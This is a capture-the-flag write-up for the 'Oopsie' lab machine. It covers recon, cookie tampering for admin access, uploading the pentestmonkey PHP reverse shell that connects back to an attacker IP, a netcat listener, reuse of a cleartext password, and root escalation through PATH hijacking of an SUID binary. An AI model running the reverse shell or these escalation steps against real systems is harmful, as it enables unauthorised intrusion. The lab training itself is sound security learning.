
# Oopsie Write-up
<span style="color:cyan;">#startingPoint</span> <span style="color:cyan;">#PHP</span>
<span style="color:cyan;">#CustomApplications</span> <span style="color:cyan;">#Apache</span>
<span style="color:cyan;">#Reconnaissance</span> <span style="color:cyan;">#WebSiteStructureDiscovery</span>
<span style="color:cyan;">#CookieManipulation</span> <span style="color:cyan;">#SUIDExploitation</span>
<span style="color:cyan;">#Authenticationbypass</span> <span style="color:cyan;">#ClearTextCredentials</span>
<span style="color:cyan;">#ArbitraryFileUpload</span> <span style="color:cyan;">#InsecureDirectObjectReference(IDOR)</span>


## Introduction
This writeup details the steps to exploit a system called "Oopsie" using a combination of vulnerabilities, including Information Disclosure and Broken Access Control. These types of vulnerabilities, while often underestimated, can be critical when chained together to achieve system compromise.

## Enumeration
1. **Initial Scan with Nmap**:
    - Command: `nmap -sC -sV {TARGET_IP}`
    - Open ports: 22 (SSH), 80 (HTTP)

2. **Web Browsing**:
    - Visited the IP and found a website for automotive services.
    - Located information suggesting the presence of a login page.

3. **Using Burp Suite**:
    - Configured Firefox to route traffic through Burp Suite for passive scanning.
    - Found the `/cdn-cgi/login` directory containing the login page.

4. **Login Attempt**:
    - Tried default credentials without success.
    - Used "Login as Guest" option and gained limited access.

## Foothold
1. **Privilege Escalation via Cookies**:
    - Accessed Developer Tools in Firefox to manipulate cookies.
    - Changed `role=guest` to `role=admin` and `user=2233` to the admin user ID.

2. **Access to Upload Form**:
    - Gained access to the upload page.
    - Uploaded a PHP reverse shell (modified for specific IP and port).
    ```
        <?php
        // php-reverse-shell - A Reverse Shell implementation in PHP
        // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
        //
        // This tool may be used for legal purposes only. Users take full responsibility
        // for any actions performed using this tool. The author accepts no liability
        // for damage caused by this tool. If these terms are not acceptable to you, then
        // do not use this tool.
        //
        <SNIP>

        set_time_limit (0);
        $VERSION = "1.0";
        $ip = '127.0.0.1'; // CHANGE THIS WITH YOUR IP
        $port = 1234; // CHANGE THIS WITH YOUR LISTENING PORT
        $chunk_size = 1400;
        $write_a = null;
        $error_a = null;
        $shell = 'uname -a; w; id; /bin/sh -i';
        $daemon = 0;
        $debug = 0;
        <SNIP>
        ?>
    ```

3. **Reverse Shell**:
    - Set up a netcat listener: `nc -lvnp 1234`
    - Accessed the uploaded shell: `http://{TARGET_IP}/uploads/php-reverse-shell.php`
    - Got a reverse shell and upgraded it: `python3 -c 'import pty;pty.spawn("/bin/bash")'`

## Lateral Movement
1. **Exploring the System**:
    - As `www-data` user, searched for interesting files.
    - Found a directory `/var/www/html/cdn-cgi/login` with PHP files.

2. **Password Discovery**:
    - Used `grep` to find passwords in the code.
    - Found `MEGACORP_4dm1n!!` password.
    - Checked `/etc/passwd` for users, found `robert`.

3. **Switching to `robert` User**:
    - Used `su robert` with the discovered password.

## Privilege Escalation
1. **Checking Group Membership**:
    - Found `robert` belongs to the `bugtracker` group.

2. **Exploit SUID Binary**:
    - `find -group bugtracker` or ``find / -perm -u=s -type f 2>/dev/null`
    - Located `/usr/bin/bugtracker` with SUID bit set.
    - Created a fake `cat` command in `/tmp` directory with a shell script.

3. **Execute Exploit**:
    - Made the script executable: `chmod +x /tmp/cat`
    - Updated PATH: `export PATH=/tmp:$PATH`
    - Ran the `bugtracker` binary from `/tmp` directory.

4. **Obtaining Root Access**:
    - Successfully executed the script to gain root access.
    - Retrieved the root flag from `/root` directory.

## Conclusion
By carefully exploiting multiple vulnerabilities, we successfully gained root access to the "Oopsie" system. This process highlights the importance of even minor vulnerabilities and how they can be chained together to achieve full system compromise.

---

*Enumeration*
- Nmap scan
- Web browsing for login page
- Burp Suite configuration and usage

*Foothold*
- Cookie manipulation for privilege escalation
- Upload and execute a reverse shell

*Lateral Movement*
- Search for sensitive files and passwords
- Switch user to gain higher privileges

*Privilege Escalation*
- Exploit SUID binary to gain root access

